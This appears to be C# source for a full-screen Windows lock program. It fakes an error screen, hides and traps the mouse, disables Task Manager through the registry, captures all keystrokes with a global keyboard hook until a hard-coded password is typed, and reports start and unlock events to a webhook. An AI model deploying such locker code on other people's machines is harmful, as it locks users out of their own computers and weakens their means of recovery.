﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Reflection;
using System.Net;
using System.Collections.Specialized;
using Windows.UI.Notifications;
using NAudio;

namespace ProjectF
{
    public partial class Main : Form
    {
        List<string> KeyLog = new List<string>();
        String pass = "password";
        String webhook = "webhookURL";

        public Main()
        {
            InitializeComponent();
            ShowCursor(false);
            setMute();
            sendWebhook("```PC Started\n" + DateTime.Now.ToString("MM월 dd일 HH시 mm분 ss초") + "```");
        }

        private void unlockPC()
        {
            ShowCursor(true);
            KeyboardHooker.UnHook();

            sendWebhook("```PC Unlocked\n" + DateTime.Now.ToString("MM월 dd일 HH시 mm분 ss초") + "```");
            setMute();
            EnableTaskManager();
            this.Close();
        }

        private void sendWebhook(String text)
        {
            try
            {
                var wb = new WebClient();
                var data = new NameValueCollection();
                data["content"] = text;
       
                wb.UploadValues(webhook, "POST", data);
            }catch(Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        event KeyboardHooker.HookedKeyboardUserEventHandler HookedKeyboardNofity;

        private long Form1_HookedKeyboardNofity(int iKeyWhatHappened, int vkCode){
            if (iKeyWhatHappened == 0)
            {
                KeyLog.Add((new KeysConverter()).ConvertToString(vkCode).ToLower());
                int RCount = 0;
                if (KeyLog.Count >= pass.Length)
                {
                    for (int i = 0; i < pass.Length; i++)
                    {
                        if (pass[i].ToString().Equals(KeyLog[KeyLog.Count - pass.Length + i]))
                        {
                            RCount++;
                        }
                    }

                    if (RCount == 0)
                    {
                        if (!KeyLog.Contains(pass[0].ToString()))
                        {
                            KeyLog.Clear();

                        }                    
                    }
                    else if (RCount == pass.Length)
                    {
                        unlockPC();
                    }
                }

            }
            return 0;
        }

        private void setMute()
        {
            using (var enumerator = new NAudio.CoreAudioApi.MMDeviceEnumerator())
            {
                foreach (var device in enumerator.EnumerateAudioEndPoints(NAudio.CoreAudioApi.DataFlow.Render, NAudio.CoreAudioApi.DeviceState.Active))
                {
                    if (device.AudioEndpointVolume?.HardwareSupport.HasFlag(NAudio.CoreAudioApi.EEndpointHardwareSupport.Mute) == true)
                    {
                        device.AudioEndpointVolume.Mute = !device.AudioEndpointVolume.Mute;
                    }
                }
            }
        }

        [DllImport("user32.dll")]
        static extern int ShowCursor(bool bShow);

        private void Main_Load(object sender, EventArgs e)
        {
            int resolutionX = System.Windows.Forms.SystemInformation.VirtualScreen.Width;
            int resolutionY = System.Windows.Forms.SystemInformation.VirtualScreen.Height;

            this.errText.Location = new Point(this.errText.Location.X * resolutionX / this.Width, this.errText.Location.Y * resolutionY / this.Height);
            this.errText.Font = new Font(this.errText.Text, this.errText.Font.Size * resolutionX / this.Width);

            this.winLogo.Location = new Point(this.winLogo.Location.X * resolutionX / this.Width, this.winLogo.Location.Y * resolutionY / this.Height);
            this.winLogo.Size = new Size(this.winLogo.Size.Width * resolutionX / this.Width, this.winLogo.Size.Height * resolutionY / this.Height);

            this.emoji.Location = new Point(this.emoji.Location.X * resolutionX / this.Width, this.emoji.Location.Y * resolutionY / this.Height);
            this.emoji.Font = new Font(this.emoji.Text, this.emoji.Font.Size * resolutionX / this.Width);
            
            this.Location = new Point(0, 0);
            this.Size = new Size(resolutionX, resolutionY);


            DisableTaskManager();
            //3. 후크 이벤트를 연결한다.
            HookedKeyboardNofity += new KeyboardHooker.HookedKeyboardUserEventHandler(Form1_HookedKeyboardNofity);

            //4. 자동으로 훅을 시작한다. 여기서 훅에 의한 이벤트를 연결시킨다.
            KeyboardHooker.Hook(HookedKeyboardNofity);
        }

        private void DisableTaskManager()
        {
            RegistryKey regkey = default(RegistryKey);
            int keyValueInt = 1;
            string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
            try
            {
                regkey = Registry.CurrentUser.CreateSubKey(subKey);
                regkey.SetValue("DisableTaskMgr", keyValueInt);
                regkey.Close();
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine(ex.Message);
            }

        }
        private void EnableTaskManager()
        {
            string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
            try
            {
                RegistryKey currentUserRegistryKey = Registry.CurrentUser;
                RegistryKey registryKey = currentUserRegistryKey.OpenSubKey(subKey);
                if (registryKey != null)
                {
                    currentUserRegistryKey.DeleteSubKeyTree(subKey);
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine(ex.Message);
            }

        }

        private void Main_MouseMove(object sender, MouseEventArgs e)
        {
            Cursor.Position = new Point(System.Windows.Forms.SystemInformation.VirtualScreen.Width/2, System.Windows.Forms.SystemInformation.VirtualScreen.Height/2);
        }
    }
    public class KeyboardHooker
    {
        // 후킹된 키보드 이벤트를 처리할 이벤트 핸들러
        private delegate long HookedKeyboardEventHandler(int nCode, int wParam, IntPtr lParam);

        /// <summary>
        /// 유저에게 노출할 이벤트 핸들러
        /// iKeyWhatHappened : 현재 입력이 KeyDown/KeyUp인지 여부 - Key별로 숫자가 다르다.
        /// vkCode : virtual key 값, System.Windows.Forms.Key의 상수 값을 int로 변환해서 대응시키면 된다.
        /// </summary>
        /// <param name="iKeyWhatHappened"></param>
        /// <param name="bAlt"></param>
        /// <param name="bCtrl"></param>
        /// <param name="bShift"></param>
        /// <param name="bWindowKey"></param>
        /// <param name="vkCode"></param>
        /// <returns></returns>
        public delegate long HookedKeyboardUserEventHandler(int iKeyWhatHappened, int vkCode);

        // 후킹된 모듈의 핸들. 후킹이 성공했는지 여부를 식별하기 위해서 사용
        private const int WH_KEYBOARD_LL = 13;		// Intalls a hook procedure that monitors low-level keyboard input events.
        private static long m_hDllKbdHook;
        private static KBDLLHOOKSTRUCT m_KbDllHs = new KBDLLHOOKSTRUCT();
        private static IntPtr m_LastWindowHWnd;
        public static IntPtr m_CurrentWindowHWnd;

        // 후킹한 메시지를 받을 이벤트 핸들러
        private static HookedKeyboardEventHandler m_LlKbEh = new HookedKeyboardEventHandler(HookedKeyboardProc);

        // 콜백해줄 이벤트 핸들러 ; 사용자측에 이벤트를 넘겨주기 위해서 사용
        private static HookedKeyboardUserEventHandler m_fpCallbkProc = null;



        #region KBDLLHOOKSTRUCT Documentation
        /// <summary>
        /// The KBDLLHOOKSTRUCT structure contains information about a low-level keyboard input event. 
        /// </summary>
        /// <remarks>
        /// <para>
        /// See <a href="ms-help://MS.VSCC/MS.MSDNVS/winui/hooks_0cxe.htm">KBDLLHOOKSTRUCT</a><BR/>
        /// </para>
        /// <para>
        /// <code>
        /// [C++]
        /// typedef struct KBDLLHOOKSTRUCT {
        ///     DWORD     vkCode;
        ///     DWORD     scanCode;
        ///     DWORD     flags;
        ///     DWORD     time;
        ///     ULONG_PTR dwExtraInfo;
        ///     ) KBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;
        /// </code>
        /// </para>
        /// </remarks>
        #endregion
        private struct KBDLLHOOKSTRUCT
        {
            #region vkCode
            /// <summary>
            /// Specifies a virtual-key code. The code must be a value in the range 1 to 254. 
            /// </summary>
            #endregion
            public int vkCode;
            #region scanCode
            /// <summary>
            /// Specifies a hardware scan code for the key. 
            /// </summary>
            #endregion
            public int scanCode;
            #region flags
            /// <summary>
            /// Specifies the extended-key flag, event-injected flag, context code, and transition-state flag.
            /// </summary>
            /// <remarks>
            /// For valid flag values and additional information, see <a href="ms-help://MS.VSCC/MS.MSDNVS/winui/hooks_0cxe.htm">MSDN Documentation for KBDLLHOOKSTRUCT</a>
            /// </remarks>
            #endregion
            public int flags;
            #region time
            /// <summary>
            /// Specifies the time stamp for this message. 
            /// </summary>
            #endregion
            public int time;
            #region dwExtraInfo
            /// <summary>
            /// Specifies extra information associated with the message. 
            /// </summary>
            #endregion
            public IntPtr dwExtraInfo;

            #region ToString()
            /// <summary>
            /// Creates a string representing the values of all the variables of an instance of this structure.
            /// </summary>
            /// <returns>A string</returns>
            #endregion
            public override string ToString()
            {
                string temp = "KBDLLHOOKSTRUCT\r\n";
                temp += "vkCode: " + vkCode.ToString() + "\r\n";
                temp += "scanCode: " + scanCode.ToString() + "\r\n";
                temp += "flags: " + flags.ToString() + "\r\n";
                temp += "time: " + time.ToString() + "\r\n";
                return temp;
            }
        }//end of structure

        #region CopyMemory Documentation
        /// <summary>
        /// The CopyMemory function copies a block of memory from one location to another. 
        /// </summary>
        /// <remarks>
        /// <para>
        /// See <a href="ms-help://MS.VSCC/MS.MSDNVS/memory/memman_0z95.htm">CopyMemory</a><BR/>
        /// </para>
        /// <para>
        /// <code>
        /// [C++]
        /// VOID CopyMemory(
        ///		PVOID Destination,   // copy destination
        ///		CONST VOID* Source,  // memory block
        ///		SIZE_T Length        // size of memory block
        ///		);
        /// </code>
        /// </para>
        /// </remarks>
        #endregion
        [DllImport(@"kernel32.dll", CharSet = CharSet.Auto)]
        private static extern void CopyMemory(ref KBDLLHOOKSTRUCT pDest, IntPtr pSource, long cb);

        #region GetForegroundWindow Documentation
        /// <summary>
        /// The GetForegroundWindow function returns a handle to the foreground window (the window with which the user is currently working).
        /// The system assigns a slightly higher priority to the thread that creates the foreground window than it does to other threads. 
        /// </summary>
        /// <remarks>
        /// <para>
        /// See <a href="ms-help://MS.VSCC/MS.MSDNVS/winui/windows_4f5j.htm">GetForegroundWindow</a><BR/>
        /// </para>
        /// <para>
        /// <code>
        /// [C++]
        /// HWND GetForegroundWindow(VOID);
        /// </code>
        /// </para>
        /// </remarks>
        #endregion
        [DllImport(@"user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetForegroundWindow();

        #region GetAsyncKeyState
        /// <summary>
        /// The GetAsyncKeyState function determines whether a key is up or down at the time the function is called,
        /// and whether the key was pressed after a previous call to GetAsyncKeyState. 
        /// </summary>
        /// <remarks>
        /// <para>
        /// See <a href="ms-help://MS.VSCC/MS.MSDNVS/winui/keybinpt_1x0l.htm">GetAsyncKeyState</a><BR/>
        /// </para>
        /// <para>
        /// <code>
        /// [C++]
        ///	SHORT GetAsyncKeyState(
        ///		int vKey   // virtual-key code
        ///		);
        /// </code>
        /// </para>
        /// </remarks>
        #endregion
        [DllImport(@"user32.dll", CharSet = CharSet.Auto)]
        private static extern uint GetAsyncKeyState(int vKey);

        #region CallNextHookEx Documentation
        /// <summary>
        /// The CallNextHookEx function passes the hook information to the next hook procedure in the current hook chain.
        /// A hook procedure can call this function either before or after processing the hook information. 
        /// </summary>
        /// <remarks>
        /// <para>
        /// See <a href="ms-help://MS.VSCC/MS.MSDNVS/winui/hooks_57aw.htm">CallNextHookEx</a><BR/>
        /// </para>
        /// <para>
        /// <code>
        /// [C++]
        /// LRESULT CallNextHookEx(
        ///    HHOOK hhk,      // handle to current hook
        ///    int nCode,      // hook code passed to hook procedure
        ///    WPARAM wParam,  // value passed to hook procedure
        ///    LPARAM lParam   // value passed to hook procedure
        ///    );
        /// </code>
        /// </para>
        /// </remarks>
        #endregion
        [DllImport(@"user32.dll", CharSet = CharSet.Auto)]
        private static extern long CallNextHookEx(long hHook, long nCode, long wParam, IntPtr lParam);

        #region SetWindowsHookEx Documentation
        /// <summary>
        /// The SetWindowsHookEx function installs an application-defined hook procedure into a hook chain.
        /// You would install a hook procedure to monitor the system for certain types of events.
        /// These events are associated either with a specific thread or with all threads in the same
        /// desktop as the calling thread. 
        /// </summary>
        /// <remarks>
        /// <para>
        /// See <a href="ms-help://MS.VSCC/MS.MSDNVS/winui/hooks_7vaw.htm">SetWindowsHookEx</a><BR/>
        /// </para>
        /// <para>
        /// <code>
        /// [C++]
        ///  HHOOK SetWindowsHookEx(
        ///		int idHook,        // hook type
        ///		HOOKPROC lpfn,     // hook procedure
        ///		HINSTANCE hMod,    // handle to application instance
        ///		DWORD dwThreadId   // thread identifier
        ///		);
        /// </code>
        /// </para>
        /// </remarks>
        #endregion
        [DllImport(@"user32.dll", CharSet = CharSet.Auto)]
        private static extern long SetWindowsHookEx(int idHook, HookedKeyboardEventHandler lpfn, long hmod, int dwThreadId);

        #region UnhookWindowsEx Documentation
        /// <summary>
        /// The UnhookWindowsHookEx function removes a hook procedure installed in a hook chain by the SetWindowsHookEx function. 
        /// </summary>
        /// <remarks>
        /// <para>
        /// See <a href="ms-help://MS.VSCC/MS.MSDNVS/winui/hooks_6fy0.htm">UnhookWindowsHookEx</a><BR/>
        /// </para>
        /// <para>
        /// <code>
        /// [C++]
        /// BOOL UnhookWindowsHookEx(
        ///    HHOOK hhk   // handle to hook procedure
        ///    );
        /// </code>
        /// </para>
        /// </remarks>
        #endregion
        [DllImport(@"user32.dll", CharSet = CharSet.Auto)]
        private static extern long UnhookWindowsHookEx(long hHook);


        // Valid return for nCode parameter of LowLevelKeyboardProc
        private const int HC_ACTION = 0;
        private static long HookedKeyboardProc(int nCode, int wParam, IntPtr lParam)
        {
            long lResult = 0;

            if (nCode == HC_ACTION) //LowLevelKeyboardProc
            {
                //visusl studio 2008 express 버전에서는 빌드 옵션에서 안전하지 않은 코드 허용에 체크
                unsafe
                {
                    //도대체 어디서 뭘 카피해놓는다는건지 이거 원..
                    CopyMemory(ref m_KbDllHs, lParam, sizeof(KBDLLHOOKSTRUCT));
                }

                //전역 후킹을 하기 위해서 현재 활성화 된 윈도우의 핸들값을 찾는다.
                //그래서 이 윈도우에서 발생하는 이벤트를 후킹해야 전역후킹이 가능해진다.
                m_CurrentWindowHWnd = GetForegroundWindow();

                //후킹하려는 윈도우의 핸들을 방금 찾아낸 핸들로 바꾼다.
                if (m_CurrentWindowHWnd != m_LastWindowHWnd)
                    m_LastWindowHWnd = m_CurrentWindowHWnd;

                // 이벤트 발생
                if (m_fpCallbkProc != null)
                {
                    lResult = m_fpCallbkProc(m_KbDllHs.flags, m_KbDllHs.vkCode);
                }

            }
            else if (nCode < 0) //나머지는 그냥 통과시킨다.
            {
                #region MSDN Documentation on return conditions
                // "If nCode is less than zero, the hook procedure must pass the message to the 
                // CallNextHookEx function without further processing and should return the value 
                // returned by CallNextHookEx. "
                // ...
                // "If nCode is greater than or equal to zero, and the hook procedure did not 
                // process the message, it is highly recommended that you call CallNextHookEx 
                // and return the value it returns;"
                #endregion
                return CallNextHookEx(m_hDllKbdHook, nCode, wParam, lParam);
            }

            //
            //lResult 값이 0이면 후킹 후 이벤트를 시스템으로 흘려보내고
            //0이 아니면 후킹도 하고 이벤트도 시스템으로 보내지 않는다.
            return lResult;
        }


        // 후킹 시작
        public static bool Hook(HookedKeyboardUserEventHandler callBackEventHandler)
        {
            bool bResult = true;
            m_hDllKbdHook = SetWindowsHookEx(
                (int)WH_KEYBOARD_LL,
                m_LlKbEh,
                Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(),
                0);

            if (m_hDllKbdHook == 0)
            {
                bResult = false;
            }
            // 외부에서 KeyboardHooker의 이벤트를 받을 수 있도록 이벤트 핸들러를 할당함
            KeyboardHooker.m_fpCallbkProc = callBackEventHandler;

            return bResult;
        }

        // 후킹 중지
        public static void UnHook()
        {
            //프로그램 종료 시점에서 호출해주자.
            UnhookWindowsHookEx(m_hDllKbdHook);
        }

    }//end of class(KeyboardHooker)

}
